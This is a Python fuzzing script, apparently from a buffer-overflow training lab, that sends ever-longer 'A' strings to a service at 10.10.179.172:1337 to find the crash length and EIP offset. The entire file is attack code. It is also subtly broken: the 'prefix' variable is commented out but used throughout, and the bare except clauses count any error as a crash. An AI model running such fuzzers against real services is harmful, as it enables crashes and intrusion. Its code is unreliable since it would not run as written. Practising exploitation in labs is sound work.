#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.179.172"

port = 1337
timeout = 5
# prefix = "OVERFLOW2 "

string = "A" * 100

length = 0


# part 2
def part2(length):
    print("Restart the Immunity CTRL + F2 Then press play")
    time.sleep(20)
    string = prefix + "A" * (length - 100)

    length = 0

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            length = len(string) - len(prefix)
            part3(length)
        string += 2 * "A"
        time.sleep(1)

# part 3
def part3(length):
    print("Restart the Immunity CTRL + F2 Then press play")
    time.sleep(20)
    string = prefix + "A" * (length - 2)

    length = 0

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            length = len(string) - len(prefix)
            print("Length is {}".format(length))
            print("EIP Offset is probably {}".format(length + 4))
            sys.exit(0)
        string += "A"
        time.sleep(1)

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        length = len(string) - len(prefix)
        part2(length)
    string += 100 * "A"
    time.sleep(1)


